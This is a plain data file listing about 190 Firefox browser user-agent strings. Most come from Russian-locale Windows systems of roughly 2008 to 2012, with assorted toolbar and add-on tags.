Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 GTB6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.5 (build 02842) Ant.com Toolbar 2.0.1 Firefox/3.6.2 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.3 (build 02563) Firefox/3.5.8 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03278) Firefox/3.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.18) Gecko/2010020220 MRA 5.3 (build 02564) Firefox/3.0.18 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.16) Gecko/2009120208 Firefox/3.0.16 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.6 (build 03270) Firefox/3.6.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 AdCentriaIM/1.7 Firefox/3.6.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 MRA 5.7 (build 03797) Firefox/3.6.28 sputnik 2.5.2.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.17) Gecko/20110420 MRA 5.7 (build 03796) Firefox/3.6.17 sputnik 2.4.0.54 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.6 (build 03278) Firefox/3.5.5 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.6 (build 03278) Firefox/3.6.2 sputnik 2.1.0.18
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.7
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.5 (build 02761) Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 GTB6 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.8) Gecko/20100214 Ubuntu/9.10 (karmic) Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.8.1.14) Gecko/20080612 Fedora/2.0.0.14-20080612.fc8.acer Firefox/2.0.0.14
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 sputnik 2.5.3.10
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.18) Gecko/2010020220 MRA 5.5 (build 02842) Firefox/3.0.18 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 sputnik 2.5.3.6
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 GTB7.1 sputnik 2.5.2.14
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.5 (build 02842) Firefox/3.6.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 (.NET CLR 2.0.50727)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.6 (build 03278) Firefox/3.6.2 sputnik 2.1.0.18 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02842) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.3 (build 02564) Firefox/3.5.5
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.6 (build 03278) Firefox/3.5.9 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.19) Gecko/2010031422 AdCentriaIM/1.7 Firefox/3.0.19 GTB6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2 GTBDFff GTB7.0
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTBDFff GTB7.0 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.13) Gecko/20101203 MRA 5.7 (build 03796) Firefox/3.6.13 ( .NET CLR 3.5.30729) sputnik 2.5.2.66
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.3 (build 02560) Firefox/3.6.3 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.19) Gecko/2010031422 MRA 5.6 (build 03278) Firefox/3.0.19 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03270) Firefox/3.6.3 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 Ant.com Toolbar 1.5 Firefox/3.5.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.6 (build 03385) Firefox/3.6.2
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.0.10) Gecko/2009042523 Ubuntu/8.10 (intrepid) Firefox/3.0.10
Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.9.2.0) Gecko/20100115 SUSE/3.6.0-1.2 Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.6 (build 03278) Firefox/3.5.9 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02842) Ant.com Toolbar 2.0.1 Firefox/3.6.3 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.23) Gecko/20110920 Firefox/3.6.23
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 (.NET CLR 2.0.50727)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.6 (build 03278) Firefox/3.5.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) AdCentriaIM/1.7 Firefox/3.6.3 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB6
Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02842) Firefox/3.6.3 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03392) Firefox/3.6.3 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.5.3 YB/3.5.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.3) Gecko/20090824 (CK-IBM) Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.8) Gecko/20100202 MRA 5.3 (build 02560) Firefox/3.5.8 GTB6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.6 (build 03385) Firefox/3.6.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 sputnik 2.5.3.4
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 AdCentriaIM/1.7 Firefox/3.6.3 sputnik 2.1.0.18
Mozilla/5.0 (Windows NT 5.2; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 AdCentriaIM/1.7 Firefox/3.5.9 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.6 (build 03278) Firefox/3.5.5 sputnik 2.1.0.18
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081216 Ubuntu/8.04 (hardy) Firefox/2.0.0.19
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0 [ip:151.95.193.249]
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 AdCentriaIM/1.7 Firefox/3.6.3 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.4 (build 02647) Firefox/3.0.19
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02812) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 sputnik 2.5.2.66
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.5 (build 02842) Firefox/3.5.9 sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.5) Gecko/2008120122 MRA 5.3 (build 02552) Firefox/3.0.5
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729) sputnik 2.5.2.32
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 AdCentriaIM/1.7 Firefox/3.6.3 GTB6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.5 (build 02842) Firefox/3.5.9 (.NET CLR 2.0.50727)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB7.0 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6 GTBDFff GTB7.0 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03396) Firefox/3.6.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 GTB6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.23) Gecko/20110920 AskTbFF/3.9.1.14019 Firefox/3.6.23 ( .NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.5 (build 02842) Firefox/3.5.9 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.1.9) Gecko/20100401 Ubuntu/9.10 (karmic) Firefox/3.5.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTBDFff GTB7.0 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02842) Firefox/3.6.3 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.6) Gecko/20091201 Firefox/2.0.0.11;MEGAUPLOAD 1.0 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.4 (build 02647) AdCentriaIM/1.7 Firefox/3.6.3
Mozilla/5.0 (Windows NT 5.1; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.5 (build 02812) Firefox/3.0.19
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 GTB6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.4 (build 02652) Firefox/3.5.9
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03270) Firefox/3.6.3 ( .NET CLR 3.5.30729) sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.5 (build 02842) Firefox/3.5.9 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 AdCentriaIM/1.7 Firefox/3.6.3 (.NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2) Gecko/20100301 Ubuntu/9.10 (karmic) Firefox/3.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03396) Firefox/3.6.3 sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.5 (build 02842) Firefox/3.0.19 sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 MRA 5.5 (build 02772) Firefox/3.0.19 sputnik unknown
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.4 (build 02652) Firefox/3.5.9 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.5 (build 02842) Firefox/3.5.9 ( .NET CLR 3.5.30729) sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3 sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 GTB7.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02842) Firefox/3.6.3 sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.5 (build 02793) Firefox/3.5.9 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 ( .NET CLR 3.5.30729; .NET4.0C)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03278) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.2) Gecko/20100316 MRA 5.6 (build 03278) Firefox/3.6.2 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.18) Gecko/2010020220 Firefox/3.0.18 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03399) Firefox/3.6.3 GTB7.1 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02842) Firefox/3.6.3 ( ) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03396) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.5 (build 02842) Firefox/3.6.3 sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 (A63CEF7C-C3A5-28CB-25B9-07DC098547DF) MRA 5.5 (build 02842) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 AdCentriaIM/1.7 Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.3 (build 02552) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.28) Gecko/20120306 AskTbNG1V5/3.15.1.22229 Firefox/3.6.28 sputnik 2.5.2.14
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.4) Gecko/20100413 Firefox/3.6.4
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03270) Firefox/3.6.3 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.9) Gecko/20100315 MRA 5.6 (build 03402) Firefox/3.5.9 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.6 (build 03278) Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03384) Firefox/3.6
Mozilla/5.0 (X11; FreeBSD amd64; rv:15.0) Gecko/20100101 Firefox/15.0.1
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.24) Gecko/20111107 Ubuntu/10.10 (maverick) Firefox/3.6.24
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.6) Gecko/2009011913 MRA 5.5 (build 02743) Firefox/3.0.6 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.10) Gecko/2009042316 AdCentriaIM/1.7 Firefox/3.0.10 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.0.30729)
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042316 Firefox/3.0
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 MRA 5.6 (build 03399) Firefox/3.6.3
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 (.NET CLR 3.5.30729) sputnik 2.3.0.74
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03278) Firefox/3.6 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.4) Gecko/20100611 MRA 5.5 (build 02842) Firefox/3.6.4 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.4) Gecko/20100611 MRA 5.6 (build 03278) Firefox/3.6.4 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 ( .NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.4 (build 02647) Firefox/3.6.6 ( .NET CLR 3.5.30729) WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 ( .NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.10) Gecko/20100504 MRA 5.6 (build 03278) Firefox/3.5.10
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.6 (build 03392) Firefox/3.6.6
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.6 (build 03278) Firefox/3.6.6 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729) Creative ZENcast v1.02.10
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.5 (build 02842) Firefox/3.6.6 sputnik 2.2.0.32
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.5 (build 02842) Firefox/3.6.6 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.15) Gecko/20110303 AskTbPTV/3.14.1.20007 Firefox/3.6.15
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.6 (build 03402) Firefox/3.6.6 sputnik 2.1.0.18
Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9.2.6) Gecko/20100628 Ubuntu/10.04 (lucid) Firefox/3.6.6
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) WebMoney Advisor MRA 5.6 (build 03399);
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 ( .NET CLR 3.0.4506.2152)
Mozilla/5.0 (Windows; U; Windows NT 5.2; ru; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 ( .NET CLR 3.5.30729; .NET4.0E)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.10) Gecko/20100504 MRA 5.6 (build 03402) Firefox/3.5.10 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.5 (build 02842) Firefox/3.6.6 (.NET CLR 3.5.30729) sputnik 2.0.1.41
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2) Gecko/20100115 MRA 5.6 (build 03402) Firefox/3.6 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.8.0.7) Gecko/20060909 MRA 5.6 (build 03278) Firefox/1.5.0.7 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.7) Gecko/20100713 Firefox/3.6.7 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.10) Gecko/20100504 MRA 5.4 (build 02647) Firefox/3.5.10 sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.3) Gecko/20090824 MRA 5.6 (build 03392) Firefox/3.5.3 sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 AskTbPTV/3.8.0.12304 Firefox/3.6.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 AskTbPTV/3.8.0.12304 Firefox/3.6.8
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1.11) Gecko/20100701 MRA 5.6 (build 03402) Firefox/3.5.11 (.NET CLR 3.5.30729) sputnik 2.1.0.18
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 (.NET CLR 3.5.30729) sputnik 2.5.3.12
Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 MR_LISA
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.6) Gecko/20100625 MRA 5.6 (build 03399) Firefox/3.6.6 (.NET CLR 3.5.30729) sputnik 2.2.0.34
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 GTB7.1 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4 WebMoney Advisor
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.7 (build 03639) Firefox/3.6.8 sputnik 2.3.0.70
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.5 (build 02842) Firefox/3.6.8 ( .NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 MRA 5.5 (build 02842) Firefox/3.6.8 sputnik 2.1.0.18
